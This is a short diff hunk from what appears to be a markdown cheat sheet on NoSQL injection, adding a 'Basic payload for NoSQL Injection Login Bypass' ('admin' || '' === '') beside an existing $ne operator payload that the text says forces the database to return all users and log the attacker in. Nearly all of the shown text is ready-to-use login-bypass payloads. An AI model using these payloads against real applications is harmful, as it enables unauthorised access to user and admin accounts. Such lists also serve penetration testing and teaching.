@@ -6,6 +6,10 @@
 
 ### 3: user[$ne]=test&pass[$ne]tset
 
+### Basic payload for NoSQL Injection Login Bypass
+
+ - admin' || '' === ' (Assuming that the user admin exists within the app)
+
 ### This forces the database to return all user documents and as a result we are logged in.
 
 ## Logging in as other users:
